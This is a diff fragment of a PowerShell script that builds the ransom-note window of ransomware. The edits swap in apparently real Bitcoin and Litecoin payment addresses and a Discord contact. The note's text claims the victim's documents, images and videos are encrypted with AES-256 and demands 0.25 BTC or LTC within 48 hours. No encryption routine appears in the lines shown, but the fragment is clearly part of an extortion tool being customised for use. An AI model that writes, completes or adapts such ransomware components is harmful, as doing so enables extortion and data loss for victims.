@@ -89,7 +89,7 @@ $label2.Font = New-Object Drawing.Font("Arial", 10)
 $form.Controls.Add($label2)
 
 $label3 = New-Object Windows.Forms.Label
-$label3.Text = "Send 0.25 BTC to: bc1qweedhackaddressxxxxxxxxxxxxx"
+$label3.Text = "Send 0.25 BTC to: bc1qweedhackaddressxxxxxxxxxxxxx or ltc: ltc1qq92x9wr62t03zx5xljx6dmemqlswwgv83sve5q"
 $label3.AutoSize = $true
 $label3.Location = New-Object Drawing.Size(20, 90)
 $label3.Font = New-Object Drawing.Font("Arial", 10, [Drawing.FontStyle]::Bold)
@@ -97,7 +97,7 @@ $form.Controls.Add($label3)
 
 $textbox = New-Object Windows.Forms.TextBox
 $textbox.Multiline = $true
-$textbox.Text = "All your documents, images, videos, and archives have been encrypted with AES-256.`n`nTo recover your files, you must pay 0.25 BTC within 48 hours.`n`nContact: weedhack@onionmail.org`nPayment address: bc1qweedhackaddressxxxxxxxxxxxxx`n`nDO NOT attempt to decrypt files yourself - you will lose them permanently."
+$textbox.Text = "All your documents, images, videos, and archives have been encrypted with AES-256.`n`nTo recover your files, you must pay 0.25 BTC or LTC within 48 hours.`n`nContact:kodaxd1 on discord `nPayment address btc: bc1qmyrx6uf6hxcc0fns4gc8l3gjygm0l6kvw4n2au or ltc: ltc1qq92x9wr62t03zx5xljx6dmemqlswwgv83sve5q`n`nDO NOT attempt to decrypt files yourself - you will lose them permanently."
 $textbox.Size = New-Object Drawing.Size(650, 180)
 $textbox.Location = New-Object Drawing.Size(20, 120)
 $textbox.ReadOnly = $true
